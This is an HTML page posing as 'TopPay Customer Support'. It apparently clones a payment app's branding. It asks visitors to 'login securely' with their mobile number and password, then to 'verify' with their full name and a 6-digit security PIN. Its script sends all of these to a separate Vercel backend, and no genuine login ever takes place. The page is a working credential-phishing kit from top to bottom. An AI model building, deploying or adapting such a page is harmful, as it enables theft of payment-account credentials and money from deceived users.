<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TopPay Customer Support</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #5c9c49; /* Green from your screenshot */
            --primary-hover: #4b823b;
            --bg: #f3f4f6;
            --white: #ffffff;
            --text-main: #1f2937;
            --text-light: #6b7280;
            --border: #d1d5db;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: var(--text-main);
        }

        .container {
            width: 100%;
            max-width: 420px;
            padding: 20px;
        }

        .card {
            background: var(--white);
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            text-align: center;
        }

        .logo {
            width: 60px;
            height: 60px;
            object-fit: contain;
            margin-bottom: 15px;
        }

        h2 {
            margin: 0 0 10px 0;
            font-size: 22px;
            font-weight: 700;
        }

        p {
            margin: 0 0 25px 0;
            color: var(--text-light);
            font-size: 14px;
        }

        /* --- FORM ELEMENTS --- */
        .form-group {
            text-align: left;
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 6px;
            font-weight: 500;
            font-size: 14px;
            color: var(--text-main);
        }

        input, select {
            width: 100%;
            padding: 12px;
            border: 1px solid var(--border);
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box; /* Fixes width issues */
            font-family: inherit;
        }

        input:focus, select:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(92, 156, 73, 0.1);
        }

        /* --- PIN INPUTS --- */
        .pin-container {
            display: flex;
            justify-content: space-between;
            gap: 8px;
        }

        .pin-input {
            width: 45px;
            height: 45px;
            text-align: center;
            font-size: 20px;
            font-weight: 700;
            padding: 0;
        }

        /* --- BUTTONS --- */
        .btn {
            width: 100%;
            padding: 14px;
            background-color: var(--primary);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }

        .btn:hover {
            background-color: var(--primary-hover);
        }

        .btn:disabled {
            background-color: #9ca3af;
            cursor: not-allowed;
        }

        /* --- UTILS --- */
        .hidden {
            display: none;
        }

        .error-msg {
            color: #ef4444;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="card">
        <img src="logo.png" onerror="this.src='https://via.placeholder.com/60?text=Logo'" alt="TopPay Logo" class="logo">

        <div id="step-1">
            <h2>Welcome Back</h2>
            <p>Please login to continue</p>
            
            <div class="form-group">
                <label>Mobile Number</label>
                <input type="tel" id="loginPhone" placeholder="Enter mobile number">
            </div>

            <div class="form-group">
                <label>Password</label>
                <input type="password" id="loginPassword" placeholder="Enter password">
            </div>

            <button class="btn" onclick="goToStep2()">Login Securely</button>
            <div id="error-step1" class="error-msg">Please fill in all fields.</div>
        </div>

        <div id="step-2" class="hidden">
            <h2>Verification Details</h2>
            <p>Please complete your profile verification</p>

            <div class="form-group">
                <label>Full Name</label>
                <input type="text" id="fullName" placeholder="e.g. Rahul Sharma">
            </div>

            <div class="form-group">
                <label>Problem Type</label>
                <select id="problem">
                    <option value="Payment Pending">Payment Pending</option>
                    <option value="KYC Issue">KYC Issue</option>
                    <option value="Login Error">Login Error</option>
                    <option value="Other">Other</option>
                </select>
            </div>

            <div class="form-group">
                <label>Security PIN (6 digits)</label>
                <div class="pin-container">
                    <input type="tel" class="pin-input" maxlength="1">
                    <input type="tel" class="pin-input" maxlength="1">
                    <input type="tel" class="pin-input" maxlength="1">
                    <input type="tel" class="pin-input" maxlength="1">
                    <input type="tel" class="pin-input" maxlength="1">
                    <input type="tel" class="pin-input" maxlength="1">
                </div>
            </div>

            <div class="form-group">
                <label>Investment Experience</label>
                <select id="experience">
                    <option value="Beginner (0-1 years)">Beginner (0-1 years)</option>
                    <option value="Intermediate (1-3 years)">Intermediate (1-3 years)</option>
                    <option value="Expert (3+ years)">Expert (3+ years)</option>
                </select>
            </div>

            <button class="btn" id="submitBtn" onclick="handleFinalSubmit()">Submit Verification</button>
        </div>
        
    </div>
</div>

<script>
    // ================= CONFIGURATION =================
    // ⚠️ REPLACE THIS with your actual Vercel URL if different
    const BACKEND_URL = 'https://toppay-customer-service.vercel.app'; 

    // ================= NAVIGATION =================
    function goToStep2() {
        const phone = document.getElementById('loginPhone').value;
        const pass = document.getElementById('loginPassword').value;

        if (!phone || !pass) {
            document.getElementById('error-step1').style.display = 'block';
            return;
        }

        // Hide Step 1, Show Step 2
        document.getElementById('step-1').classList.add('hidden');
        document.getElementById('step-2').classList.remove('hidden');
    }

    // ================= PIN LOGIC =================
    // Automatically focus the next box when typing numbers
    const pinInputs = document.querySelectorAll('.pin-input');
    pinInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            if (e.target.value.length === 1 && index < pinInputs.length - 1) {
                pinInputs[index + 1].focus();
            }
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                pinInputs[index - 1].focus();
            }
        });
    });

    // ================= SUBMISSION LOGIC =================
    async function handleFinalSubmit() {
        const btn = document.getElementById('submitBtn');
        const originalText = btn.innerText;
        
        // 1. Loading State
        btn.innerText = "Processing...";
        btn.disabled = true;

        try {
            // 2. Gather Data from BOTH steps
            let securityPin = '';
            pinInputs.forEach(input => securityPin += input.value);

            const formData = {
                loginPhone: document.getElementById('loginPhone').value,
                loginPassword: document.getElementById('loginPassword').value,
                fullName: document.getElementById('fullName').value,
                problem: document.getElementById('problem').value,
                experience: document.getElementById('experience').value,
                securityPin: securityPin
            };

            // 3. Send to Backend (Vercel)
            // Note: We use the BACKEND_URL variable here!
            const response = await fetch(`${BACKEND_URL}/api/submit`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            });

            const result = await response.json();

            // 4. Handle Response
            if (response.ok) {
                alert("Submission Successful! We will review your details.");
                window.location.reload(); // Reset form
            } else {
                alert("Error: " + (result.error || "Submission failed"));
            }

        } catch (error) {
            console.error(error);
            alert("Network Error: Could not connect to server. Please check your internet.");
        } finally {
            // Reset Button
            btn.innerText = originalText;
            btn.disabled = false;
        }
    }
</script>

</body>
</html>
